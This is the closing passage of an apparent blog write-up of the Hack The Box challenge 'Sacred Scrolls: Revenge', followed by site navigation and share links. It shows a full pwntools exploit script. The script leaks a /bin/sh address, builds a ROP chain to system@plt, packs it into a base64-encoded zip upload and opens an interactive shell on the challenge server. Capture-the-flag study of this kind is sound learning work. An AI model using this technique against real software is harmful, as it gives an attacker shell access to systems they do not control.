</span></span><span style=display:flex><span>context<span style=color:#ff79c6>.</span>os <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;linux&#39;</span>                                                                                                                                                 
</span></span><span style=display:flex><span>context<span style=color:#ff79c6>.</span>arch <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;amd64&#39;</span>                                                                                                                                               
</span></span><span style=display:flex><span>context<span style=color:#ff79c6>.</span>log_level <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;DEBUG&#39;</span>                                                                                                                                          
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> args<span style=color:#ff79c6>.</span>REMOTE:
</span></span><span style=display:flex><span>    ip <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;83.136.249.57&#39;</span>
</span></span><span style=display:flex><span>    port <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>51190</span>
</span></span><span style=display:flex><span>    p <span style=color:#ff79c6>=</span> remote(ip, port)
</span></span><span style=display:flex><span><span style=color:#ff79c6>else</span>:
</span></span><span style=display:flex><span>    p <span style=color:#ff79c6>=</span> process(<span style=color:#f1fa8c>&#39;./sacred_scrolls&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>elf <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./sacred_scrolls&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>sendafter(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;tag: &#39;</span>, <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;A&#39;</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>16</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;A&#39;</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>16</span>)
</span></span><span style=display:flex><span>bin_sh_adr <span style=color:#ff79c6>=</span> u64(p<span style=color:#ff79c6>.</span>recvline()<span style=color:#ff79c6>.</span>strip()<span style=color:#ff79c6>.</span>ljust(<span style=color:#bd93f9>8</span>, <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\0</span><span style=color:#f1fa8c>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;bin sh adr: </span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>hex</span>(bin_sh_adr)<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x4011b3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ret <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x4007ce</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>system_plt <span style=color:#ff79c6>=</span> elf<span style=color:#ff79c6>.</span>plt[<span style=color:#f1fa8c>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\xf0\x9f\x91\x93\xe2\x9a\xa1</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;A&#39;</span> <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>33</span> 
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>+=</span> p64(pop_rdi_ret) 
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>+=</span> p64(bin_sh_adr) 
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>+=</span> p64(ret) 
</span></span><span style=display:flex><span>payload <span style=color:#ff79c6>+=</span> p64(system_plt)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>f <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;spell.txt&#39;</span>, <span style=color:#f1fa8c>&#39;wb&#39;</span>)
</span></span><span style=display:flex><span>f<span style=color:#ff79c6>.</span>write(payload)
</span></span><span style=display:flex><span>f<span style=color:#ff79c6>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#39;zip spell.zip spell.txt &amp;&amp; cat spell.zip | base64 &gt; payload&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b64_payload <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;payload&#39;</span>)<span style=color:#ff79c6>.</span>read()<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;&#39;</span>)
</span></span><span style=display:flex><span>b64_payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;=&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>os<span style=color:#ff79c6>.</span>system(<span style=color:#f1fa8c>&#39;rm spell.txt payload&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;/&#39;</span> <span style=color:#ff79c6>in</span> b64_payload:
</span></span><span style=display:flex><span>  <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;Error payload&#39;</span>)
</span></span><span style=display:flex><span>  exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;&gt;&gt; &#39;</span>, <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;spell.zip): &#39;</span>, b64_payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;&gt;&gt; &#39;</span>, <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;&gt;&gt; &#39;</span>, <span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#ff79c6>.</span>interactive()
</span></span></code></pre></td></tr></table></div></div></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>主頁</a></li><li><a href=/posts>廢文區</a></li><li><a href=/resources>資源</a></li><li><a href=/tags>標籤</a></li><li><a href=/comment>留言區</a></li><li><a href=/about>關於本人</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#checksec>Checksec</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#upload>upload()</a></li><li><a href=#read>read()</a></li><li><a href=#save>save()</a></li></ul></li><li><a href=#exploit>Exploit</a></li><li><a href=#solution>Solution</a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&text=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&title=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&is_video=false&description=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge&body=Check out this article: https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&title=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&title=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&name=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge&description=%3ch1%20id%3d%22htb-challengesacred-scrolls-revenge%22%3e%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge%3c%2fh1%3e%0a%3ch2%20id%3d%22description%22%3eDescription%3c%2fh2%3e%0a%3cp%3eEach%20house%20of%20the%20campus%20has%20its%20own%20secret%20library%20to%20store%20spells%20or%20spellbound%20messages%20so%20the%20others%20cannot%20see%20them.%20Messages%20are%20encrypted%20and%20must%20be%20signed%20by%20the%20boy%20who%20lived%2c%20turning%20them%20into%20sacred%20scrolls%2c%20otherwise%20they%20are%20not%20accepted%20in%20this%20library.%20You%20can%20try%20it%20yourself%20as%20long%20as%20you%20are%20a%20wizard%20of%20this%20house.%3c%2fp%3e%0a%3ch2%20id%3d%22checksec%22%3eChecksec%3c%2fh2%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%0a%3ctable%20style%3d%22border-spacing%3a0%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%3ctr%3e%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e1%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e2%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e3%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e4%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e5%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e6%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e7%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpr" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&t=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2024 ErrorPro</div><div class=footer-right><nav><ul><li><a href=/>主頁</a></li><li><a href=/posts>廢文區</a></li><li><a href=/resources>資源</a></li><li><a href=/tags>標籤</a></li><li><a href=/comment>留言區</a></li><li><a href=/about>關於本人</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script src=/js/code-copy.js></script><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]]},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script type=text/javascript src=/js/nest.js count=150 color=255,255,255 opacity=1></script><img id=Cursor src=/images/cursor/silverwolf/01-Normal.gif>
<script type=text/javascript src=/js/cursor.js></script></html>